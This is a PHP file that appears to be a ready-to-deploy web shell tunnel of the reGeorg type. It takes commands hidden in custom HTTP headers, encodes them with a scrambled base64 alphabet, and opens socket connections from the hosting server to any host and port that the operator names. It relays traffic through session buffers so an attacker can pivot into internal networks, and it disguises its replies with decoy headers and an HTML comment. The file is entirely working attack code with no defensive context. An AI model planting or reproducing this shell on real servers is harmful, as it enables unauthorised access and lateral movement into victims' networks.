<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "sIzFYe5cLm8r+l4iBOdUK2vAjZWJpatyToC9u670HxVNDSEb3qfwhk/1nQXPgRMG";

$cmd = $headers["Lj"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "4687pSpXHsaXyNEKyVRAWvUnqbg7XO1cUvRFMK1q6amDXug1HumBt34SY4GJBrshc":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Ffu"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Mjsawynuipctbq: akKJpBiJQEJfjj9plOs');
                header('Bbvyhcmq: anDl2ONSBtEdFYspGa0j4rScZjPF0A');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "TkMl3NV":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "fcNsRCEF9F7s2k3YA2":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Mjsawynuipctbq: ECE0QxDqyrHyt6fW3yDTO5M5X3ZHqam3YTWkroWFoE');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Mjsawynuipctbq: akKJpBiJQEJfjj9plOs');
            }
        }
        break;
    case "PxLEYw63oB_31cNaEI86hujtf1d_UffWhCN": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Mjsawynuipctbq: akKJpBiJQEJfjj9plOs');
                header('Bbvyhcmq: DRE47YkVbqJ56hBj2Jv9K0p7uubFv7D8rDJTnvM6PEM3TkDWQPj9zaKC6j');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Mjsawynuipctbq: ECE0QxDqyrHyt6fW3yDTO5M5X3ZHqam3YTWkroWFoE');
                header("Connection: Keep-Alive");
            } else {
                header('Mjsawynuipctbq: akKJpBiJQEJfjj9plOs');
                header('Bbvyhcmq: r2E9EaFsDwJbcAr0RmheGsp_oworVcd5iBHFJk1BfKtsE6OBc4YeGGnA');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- GuezQW3DN8buwGT9tPoVbGD2QSQKdRma8IUDo -->");
    }
}
?>
